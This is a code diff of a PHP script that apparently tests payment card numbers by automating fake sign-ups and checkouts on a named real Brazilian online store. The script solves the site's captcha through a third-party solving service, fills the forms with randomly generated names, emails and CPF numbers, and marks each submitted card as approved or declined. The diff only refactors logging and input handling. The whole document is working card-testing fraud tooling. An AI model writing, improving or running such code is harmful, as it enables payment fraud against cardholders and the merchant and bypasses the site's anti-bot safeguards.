@@ -42,7 +42,9 @@ function getCaptchaToken($apiKey, $websiteUrl, $websiteKey) {
         curl_close($ch);
         
         $result = json_decode($response, true);
-        if ($result['status'] === 'ready') return $result['solution']['gRecaptchaResponse'];
+        if (isset($result['status']) && $result['status'] === 'ready' && isset($result['solution']['gRecaptchaResponse'])) {
+            return $result['solution']['gRecaptchaResponse'];
+        }
         
         $attempts++;
         sleep(2);
@@ -107,29 +109,18 @@ function gerarCPF() {
     return $cpf . $digito1 . $digito2;
 }
 
-// ======================== DADOS PARA TESTE ========================
-$nomes = ['Carlos', 'João', 'Maria', 'Paulo', 'Ana', 'Lucas', 'Bruna', 'Rafael', 'Camila', 'Roberto'];
-$sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Lima', 'Barbosa'];
-
-$nome = $nomes[array_rand($nomes)];
-$sobrenome = $sobrenomes[array_rand($sobrenomes)];
-$email = strtolower($nome . $sobrenome . rand(1, 99) . '@gmail.com');
-$userAgent = gerarUserAgent();
-$uuid = generateUUID();
-$cpf = gerarCPF();
-
 // ======================== ENTRADA DO CARTÃO ========================
-// Aceitar via GET, POST ou CLI
-$lista = $_GET['lista'] ?? $_POST['lista'] ?? ($argv[1] ?? '');
-
-// Configurar header JSON para TODAS as respostas
+// Configurar header JSON PRIMEIRO (antes de qualquer output)
 header('Content-Type: application/json; charset=utf-8');
+
+// Aceitar via GET, POST ou CLI
+$lista = isset($_GET['lista']) ? strval($_GET['lista']) : (isset($_POST['lista']) ? strval($_POST['lista']) : ($argv[1] ?? ''));
 
 // Se não houver dados, retornar JSON
 if (empty($lista)) {
     if (php_sapi_name() === 'cli') {
-        echo "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n";
-        echo "Uso: php faltaaddapi.php '5500000000000004:12:2025:123'\n";
+        fwrite(STDERR, "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n");
+        fwrite(STDERR, "Uso: php faltaaddapi.php '5500000000000004:12:2025:123'\n");
         exit(1);
     } else {
         http_response_code(400);
@@ -140,14 +131,14 @@ if (empty($lista)) {
 
 $parts = multiexplode([":", "|"], $lista);
 $cc = $parts[0] ?? '';
-$mes = ltrim($parts[1] ?? '', '0');
-$ano = substr($parts[2] ?? '', 2);
+$mes = isset($parts[1]) ? str_pad($parts[1], 2, '0', STR_PAD_LEFT) : '';
+$ano = isset($parts[2]) ? substr($parts[2], -2) : '';
 $cvv = $parts[3] ?? '';
 
 // Validação do cartão
 if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
     if (php_sapi_name() === 'cli') {
-        echo "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n";
+        fwrite(STDERR, "❌ Erro: Dados do cartão incompletos. Formato: CC:MES:ANO:CVV\n");
         exit(1);
     } else {
         http_response_code(400);
@@ -169,12 +160,23 @@ if ($primeiro == 4) $bandeira = 'visa';
 elseif ($primeiro == 5 || $primeiro == 2) $bandeira = 'mastercard';
 elseif ($primeiro == 3) $bandeira = 'amex';
 
-// ======================== CAPTCHA ========================
-$token = $_GET['token'] ?? $_POST['token'] ?? ($argv[2] ?? null);
+// ======================== DADOS PARA TESTE ========================
+$nomes = ['Carlos', 'João', 'Maria', 'Paulo', 'Ana', 'Lucas', 'Bruna', 'Rafael', 'Camila', 'Roberto'];
+$sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Lima', 'Barbosa'];
 
-// Validar e resolver token automaticamente
+$nome = $nomes[array_rand($nomes)];
+$sobrenome = $sobrenomes[array_rand($sobrenomes)];
+$email = strtolower($nome . $sobrenome . rand(1, 99) . '@gmail.com');
+$userAgent = gerarUserAgent();
+$uuid = generateUUID();
+$cpf = gerarCPF();
+
+// ======================== CAPTCHA ========================
+$token = isset($_GET['token']) ? strval($_GET['token']) : (isset($_POST['token']) ? strval($_POST['token']) : ($argv[2] ?? null));
+
+// Validar e resolver token automaticamente (STDERR para não quebrar JSON)
 if (empty($token)) {
-    echo "🔄 Resolvendo captcha automaticamente...\n";
+    fwrite(STDERR, "🔄 Resolvendo captcha automaticamente...\n");
     $token = getCaptchaToken($apiKey, $websiteUrl, $websiteKey);
     if (!$token) {
         if (php_sapi_name() !== 'cli') {
@@ -182,11 +184,11 @@ if (empty($token)) {
             echo json_encode(['erro' => 'Falha ao resolver captcha. Verifique sua chave de API.']);
             exit;
         } else {
-            echo "❌ Erro: Falha ao resolver captcha. Verifique sua chave de API.\n";
+            fwrite(STDERR, "❌ Erro: Falha ao resolver captcha. Verifique sua chave de API.\n");
             exit(1);
         }
     }
-    echo "✅ Captcha resolvido com sucesso!\n";
+    fwrite(STDERR, "✅ Captcha resolvido com sucesso!\n");
 }
 
 // ======================== COOKIE ========================
@@ -209,12 +211,12 @@ $security_signup = '';
 $process_nonce = '';
 
 // 1. Home
-echo "[1/7] Acessando página inicial...\n";
+fwrite(STDERR, "[1/7] Acessando página inicial...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/');
 curl_setopt($ch, CURLOPT_POST, false);
 $response = curl_exec($ch);
 if (!$response) {
-    echo "❌ Erro ao acessar home\n";
+    fwrite(STDERR, "❌ Erro ao acessar home\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -224,12 +226,12 @@ if (!$response) {
 }
 
 // 2. Product Page
-echo "[2/7] Acessando página de produto...\n";
+fwrite(STDERR, "[2/7] Acessando página de produto...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/academia-de-discursivas/');
 curl_setopt($ch, CURLOPT_POST, false);
 $response = curl_exec($ch);
 if (!$response) {
-    echo "❌ Erro ao acessar produto\n";
+    fwrite(STDERR, "❌ Erro ao acessar produto\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -244,11 +246,11 @@ $state = buscar($response, "type='hidden' class='gform_hidden' name='state_92' v
 $security_signup = buscar($response, "name='security-signup' value='", "'") ?: '';
 
 if (empty($version_hash)) {
-    echo "⚠️ Aviso: version_hash não encontrado\n";
+    fwrite(STDERR, "⚠️ Aviso: version_hash não encontrado\n");
 }
 
 // 3. Register
-echo "[3/7] Realizando cadastro...\n";
+fwrite(STDERR, "[3/7] Realizando cadastro...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/?lrm=1');
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
@@ -266,7 +268,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
 ]));
 $response = curl_exec($ch);
 if (!$response) {
-    echo "❌ Erro ao realizar cadastro\n";
+    fwrite(STDERR, "❌ Erro ao realizar cadastro\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -276,12 +278,12 @@ if (!$response) {
 }
 
 // 4. Add to Cart
-echo "[4/7] Adicionando item ao carrinho...\n";
+fwrite(STDERR, "[4/7] Adicionando item ao carrinho...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/carrinho/?add-to-cart=222045');
 curl_setopt($ch, CURLOPT_POST, false);
 $response = curl_exec($ch);
 if (!$response) {
-    echo "❌ Erro ao adicionar ao carrinho\n";
+    fwrite(STDERR, "❌ Erro ao adicionar ao carrinho\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -291,12 +293,12 @@ if (!$response) {
 }
 
 // 5. Cart Page
-echo "[5/7] Acessando página do carrinho...\n";
+fwrite(STDERR, "[5/7] Acessando página do carrinho...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/carrinho/');
 curl_setopt($ch, CURLOPT_POST, false);
 $response = curl_exec($ch);
 if (!$response) {
-    echo "❌ Erro ao acessar carrinho\n";
+    fwrite(STDERR, "❌ Erro ao acessar carrinho\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -306,12 +308,12 @@ if (!$response) {
 }
 
 // 6. Checkout Page
-echo "[6/7] Acessando página de checkout...\n";
+fwrite(STDERR, "[6/7] Acessando página de checkout...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/finalizar-compra/');
 curl_setopt($ch, CURLOPT_POST, false);
 $response = curl_exec($ch);
 if (!$response) {
-    echo "❌ Erro ao acessar checkout\n";
+    fwrite(STDERR, "❌ Erro ao acessar checkout\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -323,7 +325,7 @@ if (!$response) {
 // Extrair nonce de segurança
 $process_nonce = buscar($response, 'name="woocommerce-process-checkout-nonce" value="', '"');
 if (!$process_nonce) {
-    echo "❌ Erro: Nonce de checkout não encontrado\n";
+    fwrite(STDERR, "❌ Erro: Nonce de checkout não encontrado\n");
     if (file_exists($cookieFile)) unlink($cookieFile);
     if (php_sapi_name() !== 'cli') {
         http_response_code(500);
@@ -333,7 +335,7 @@ if (!$process_nonce) {
 }
 
 // 7. Final Checkout
-echo "[7/7] Processando pagamento...\n";
+fwrite(STDERR, "[7/7] Processando pagamento...\n");
 curl_setopt($ch, CURLOPT_URL, 'https://voceconcursado.com.br/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
@@ -377,11 +379,11 @@ if (!$response) {
         'cartao' => $cc,
         'http_status' => $httpCode
     ];
-    echo "❌ Erro: Falha na requisição final\n";
+    fwrite(STDERR, "❌ Erro: Falha na requisição final\n");
 } else {
     $json = json_decode($response, true);
     
-    if (isset($json['result']) && $json['result'] === 'success') {
+    if ($json !== null && isset($json['result']) && $json['result'] === 'success') {
         $resultado = [
             'status' => 'aprovada',
             'mensagem' => 'Cartão aprovado com sucesso',
@@ -390,25 +392,25 @@ if (!$response) {
             'cpf' => $cpf,
             'http_status' => $httpCode
         ];
-        echo "✅ APROVADA: $cc|$mes|$ano|$cvv\n";
-        echo "   Email: $email\n";
-        echo "   CPF: $cpf\n";
-        echo "   HTTP Status: $httpCode\n";
+        fwrite(STDERR, "✅ APROVADA: $cc|$mes|$ano|$cvv\n");
+        fwrite(STDERR, "   Email: $email\n");
+        fwrite(STDERR, "   CPF: $cpf\n");
+        fwrite(STDERR, "   HTTP Status: $httpCode\n");
     } else {
-        $msg = isset($json['messages']) ? strip_tags($json['messages']) : (json_encode($json) ?: 'Erro desconhecido');
+        $msg = ($json !== null && isset($json['messages'])) ? strip_tags($json['messages']) : 'Erro desconhecido';
         $resultado = [
             'status' => 'reprovada',
             'mensagem' => $msg,
             'cartao' => "$cc|$mes|$ano|$cvv",
             'http_status' => $httpCode
         ];
-        echo "❌ REPROVADA: $cc|$mes|$ano|$cvv\n";
-        echo "   Motivo: $msg\n";
-        echo "   HTTP Status: $httpCode\n";
+        fwrite(STDERR, "❌ REPROVADA: $cc|$mes|$ano|$cvv\n");
+        fwrite(STDERR, "   Motivo: $msg\n");
+        fwrite(STDERR, "   HTTP Status: $httpCode\n");
     }
 }
 
-echo str_repeat("=", 50) . "\n";
+fwrite(STDERR, str_repeat("=", 50) . "\n");
 
 // Retornar JSON se for requisição web
 if (php_sapi_name() !== 'cli') {
